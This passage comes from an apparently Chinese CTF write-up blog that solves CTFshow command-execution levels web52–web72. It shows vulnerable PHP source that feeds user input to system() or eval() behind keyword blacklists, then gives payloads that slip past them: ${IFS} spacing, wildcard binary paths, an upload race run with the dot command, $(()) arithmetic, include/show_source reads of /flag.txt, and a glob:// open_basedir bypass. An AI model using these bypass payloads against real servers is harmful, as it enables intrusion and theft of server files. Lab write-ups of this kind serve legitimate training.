src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52_01.png" alt=""></p><p>发现是个假的flag，尝试查看其它目录，但是利用的方法还是一样的</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52_02.png" alt=""></p><p>在根目录发现flag，利用<code>cp$&#123;IFS&#125;/fl?g$&#123;IFS&#125;/var/www/html/b.txt</code>将flag拷贝到我们能访问到的目录下，访问b.txt，拿到flag</p><h1 id="web53"><a href="#web53" class="headerlink" title="web53()"></a>web53()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作方法同上，只不过这次<code>ls</code>显示的flag.php是真的，直接拷贝复制，访问即可</p><p><code>payload: ?c=cp$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt%0a    访问a.txt</code></p><h1 id="web54"><a href="#web54" class="headerlink" title="web54()"></a>web54()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=mv$&#123;IFS&#125;f???.php$&#123;IFS&#125;b.txt%0a    访问b.txt</code></p><p>本题过滤的有点丧心病狂，但是可以用mv指令进行重命名</p><h1 id="web55"><a href="#web55" class="headerlink" title="web55()"></a>web55()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=/???/????64 ????.???</code> </p><p>本题过滤了字母，但是数字没有被过滤，这是可以利用linux下的<code>/bin/base64</code>结合通配符使用</p><p>最后将输出的内容解码，拿到flag</p><h1 id="web56-文件上传"><a href="#web56-文件上传" class="headerlink" title="web56(文件上传)"></a>web56(文件上传)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先推荐两篇文章</p><ul><li><a href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">LINUX中的点命令</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li></ul><p>我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过<code>.(点)</code>去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在<a href="https://so.csdn.net/so/search?q=linux&amp;spm=1001.2101.3001.7020">linux</a>下面保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</p><p>创建一个POST提交文件的html文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://7ed0b631-cb94-479a-adc5-9c49fc745723.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接为当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>  <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &lt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上传文件的时候抓包</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/56.png" alt=""></p><p>在第一行添加如下内容：（固定格式）</p><p><code>?c=.%20/???/????????[@-[]</code></p><p>将内容修改为payload</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/56_01.png" alt=""></p><p>将抓包关闭，发送，发现成功执行命令</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/56_02.png" alt=""></p><p>最终payload：<code>cat f*</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/56_03.png" alt=""></p><h1 id="web57"><a href="#web57" class="headerlink" title="web57($(()))"></a>web57($(()))</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现过滤了很多，但是提示说flag在36.php中，所以我们的目标只需要构造一个36即可</p><p>发现没有过滤<code>$</code>和<code>()</code>，只需要利用这三个就可以构造</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/57.png" alt=""></p><p>发现只需要构造36个-1在取反即可</p><p>最终payload：<br><code>?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</code></p><h1 id="web58-禁用函数"><a href="#web58-禁用函数" class="headerlink" title="web58(禁用函数)"></a>web58(禁用函数)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有过滤？菜鸡狂喜</p><p>在输出命令的时候发现好多命令都被禁用了</p><p>尝试利用文件读取</p><p><code>c=echo file_get_content(&quot;index.php&quot;);</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/58.png" alt=""></p><p>发现并没有被禁用，盲猜一波，直接读取flag.php</p><p><code>c=echo file_get_content(&quot;flag.php&quot;);</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/58_01.png" alt=""></p><p>成功！</p><h1 id="web59"><a href="#web59" class="headerlink" title="web59()"></a>web59()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不让用<code>file_get_contents()</code>，换个其他函数</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web60"><a href="#web60" class="headerlink" title="web60()"></a>web60()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是禁用函数，但是payload跟上题一样</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web61"><a href="#web61" class="headerlink" title="web61()"></a>web61()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用函数，，上题的payload依旧能用</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web62"><a href="#web62" class="headerlink" title="web62()"></a>web62()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload同上</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web63"><a href="#web63" class="headerlink" title="web63()"></a>web63()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload同上</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web64"><a href="#web64" class="headerlink" title="web64()"></a>web64()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload同上</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web65"><a href="#web65" class="headerlink" title="web65()"></a>web65()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload同上</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web66"><a href="#web66" class="headerlink" title="web66()"></a>web66()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把<code>show_source</code>禁掉了，，可以用<code>highlight_file</code>替换，但是还是不行</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66.png" alt=""></p><p>可以发现代码是执行了的，但是flag不在这里，利用<code>scandir()</code>配合<code>var_dump()</code>查看目录内容</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66_01.png" alt=""></p><p>在根目录发现flag，直接<code>highlight_file()</code>查看即可</p><p><code>paylaod: highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web67"><a href="#web67" class="headerlink" title="web67()"></a>web67()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作同上</p><p><code>paylaod: highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web68"><a href="#web68" class="headerlink" title="web68()"></a>web68()</h1><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68.png" alt=""></p><p>这回直接ban掉了<code>highlight_file</code>，导致源码都看不到了</p><p>不过按照之前的套路，依旧可以进行post传参</p><p>尝试<code>include</code>包含文件</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68_01.png" alt=""></p><p>文件太大了，尝试跟上题一样的套路，访问根目录的flag.txt</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68_03.png" alt=""></p><p>成功！</p><p><code>paylaod:include(&#39;/flag.txt&#39;);</code></p><h1 id="web69"><a href="#web69" class="headerlink" title="web69()"></a>web69()</h1><p>操作同上</p><p><code>paylaod:include(&#39;/flag.txt&#39;);</code></p><h1 id="web70"><a href="#web70" class="headerlink" title="web70()"></a>web70()</h1><p>操作同上</p><p><code>paylaod:include(&#39;/flag.txt&#39;);</code></p><h1 id="web71"><a href="#web71" class="headerlink" title="web71()"></a>web71()</h1><p>本题发现之前的payload不好使了，但是可以下载源码看看</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概意思就是把我们POST的数据包含字母数字的全部替换成<code>?</code>了</p><p>很明显这是一个无数字、无字母的rce</p><p>但是仔细看会发现，在输出之前，会执行我输入的代码</p><p>我们可以在执行代码后直接终止程序，这样后面的代码就不会执行了</p><p><code>payload: c=include(&quot;/flag.txt);exit();</code></p><h1 id="web72-disable-function"><a href="#web72-disable-function" class="headerlink" title="web72(disable_function())"></a>web72(disable_function())</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码跟上题一样，但是上题的payload不好使了，因为找不到文件</p><p>尝试扫描根目录，<code>c=var_dump(scandir(&#39;/&#39;));exit();</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/72.png" alt=""></p><p>发现<code>var_dump()</code>被禁用了，且用<code>open_basedir</code>限制了读取目录</p><p> 可以利用<code>glob://</code>伪协议读取所有文本信息</p><blockquote><p><code>glob</code> 伪协议是一种用于在URL中进行模式匹配和文件查找的协议。它可以通过使用通配符来匹配文件系统中的多个文件，并将它们作为结果返回。</p><p>使用 <code>glob</code> 伪协议，可以在支持该协议的应用程序或工具中执行文件或目录的模式匹配。一些常见的应用包括命令行终端、脚本和编程语言中的文件查找函数。</p><p>例如：<code>glob:/path/to/directory/*.txt</code></p><p><code>/path/to/directory/</code> 是要搜索的目录路径，而 <code>*.txt</code> 是一个通配符模式，用于匹配该目录中以 <code>.txt</code> 结尾的所有文件。</p></blockquote><p>所以可以构造代码来读取文本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span 